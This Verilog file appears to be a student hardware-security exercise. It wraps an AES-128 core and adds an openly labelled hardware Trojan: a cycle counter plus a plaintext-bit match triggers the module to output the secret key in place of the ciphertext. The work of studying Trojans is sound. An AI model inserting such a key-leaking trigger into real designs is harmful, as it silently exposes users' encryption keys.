`timescale 1ns / 1ps

module AES_top #(
    parameter STUDENT_ID = 32'd112021101  
)(
    input clk,
    input rst,
    input [127:0] plaintext,
    input [127:0] key,
    output reg [127:0] out
);

    wire [127:0] ciphertext;

    aes_128 aes (
        .clk(clk),
        .state(plaintext),
        .key(key),
        .out(ciphertext)
    );

    // ====================================================
    // Part 2:  Hardware Trojan
    // ====================================================
    
    localparam TARGET_CYCLE = (STUDENT_ID % 200) + 100;

    reg [31:0] cycle_cnt;
    
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            cycle_cnt <= 32'd0;      
        end else begin
            cycle_cnt <= cycle_cnt + 32'd1;
        end
    end

    wire trojan_trigger;
    

    assign trojan_trigger = (cycle_cnt == TARGET_CYCLE) && 
                            (plaintext[23:0] == STUDENT_ID[23:0]);

    
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            out <= {128{1'bx}};  
        end 
        else begin
            if (trojan_trigger) begin
                out <= key;         
            end else begin
                out <= ciphertext;  
            end
        end
    end

endmodule